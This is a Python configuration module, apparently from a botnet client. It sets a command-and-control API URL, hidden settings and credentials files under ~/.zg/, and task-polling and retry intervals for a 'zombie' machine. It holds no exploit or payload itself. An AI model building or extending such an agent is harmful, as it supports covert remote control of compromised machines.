#!/usr/bin/env python
# -*- coding: utf-8 -*-
# r3nt0n

import os

from app.modules.machine import get_zombie_settings, set_zombie_settings

class Config:
    def __init__(self):
        # enable/disable debug
        self.DEBUG = True
        # default paths
        self.BASE_DIR = os.path.expanduser('~/.zg/')
        self.PATH_SETTINGS = os.path.join(self.BASE_DIR, 'zg.conf')
        self.PATH_CREDENTIALS = os.path.join(self.BASE_DIR, 'zg.cred')
        # url to cc api
        self.credentials = {'cc_url': 'http://127.0.0.1:8080/api'}
        # default settings
        self.settings = {
            'refresh_tasks': 10.5,     # secs between each task refresh
            'inet_unreach_retry': 15,  # secs between each retry after conn error
            'token_check_retry': 30    # secs between each token expiration recheck
        }

    def read_setting(self, field):
        while True:
            try:
                value = self.settings[field]
                return value
            except KeyError:
                self.set_setting(field, 10.5)
                return False

    def set_setting(self, field, value):
        try:
            self.settings[field] = value
            return True
        except KeyError:
            return False
        finally:
            self.write_settings()

    # read saved conf from winreg/file
    def load_settings(self):
        settings = get_zombie_settings(self.PATH_SETTINGS, 'settings')
        if settings:
            self.settings = settings
            return True
        return False

    def load_credentials(self):
        credentials = get_zombie_settings(self.PATH_CREDENTIALS, 'credentials')
        if credentials:
            self.credentials = credentials
            return True
        return False

    # write running conf to winreg/file
    def write_settings(self):
        if set_zombie_settings(self.PATH_SETTINGS, 'settings', self.settings):
            return True
        return False

    def write_credentials(self):
        if set_zombie_settings(self.PATH_CREDENTIALS, 'credentials', self.credentials):
            return True
        return False

    def autosetup(self):
        pass